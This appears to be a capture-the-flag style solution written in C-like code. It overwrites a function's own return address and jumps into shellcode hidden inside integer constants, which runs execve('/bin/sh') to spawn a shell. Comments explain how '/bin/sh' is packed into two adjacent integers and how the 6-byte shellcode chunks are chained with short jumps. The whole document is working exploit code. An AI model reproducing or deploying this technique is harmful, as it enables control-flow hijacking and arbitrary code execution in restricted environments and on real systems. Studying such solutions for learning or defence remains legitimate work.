// Even though they're technically just 2 ints,
// they get placed next to each other letting us write arbitrary strings
_1 = 1852400175; // /bin
_2 = 6845231;    // /sh

// empty func that allows us to write data to rsi (2nd arg)
_0_0(_, __) {}

// function that increments return address by 2, letting us return to our shellcode
_0_1(_) {
    *(&_+3)+=2;
}

_0_2(_) {}

_() {
    _0_0(0,&_1); // put /bin/sh in rsi
    _0_1(0); // incrememnt return value by 2, so it jumps into our shellcode (the func args in the next 2 funcs)

    // our syscall shellcode to call execve("/bin/sh", 0, 0)
    // we can only encode 6 bytes because the last 2 bytes have to be a short jmp to the next part
    // that's why I did it twice
    _0_2(1147076160420667222);
    _0_2(5565509137969);
}
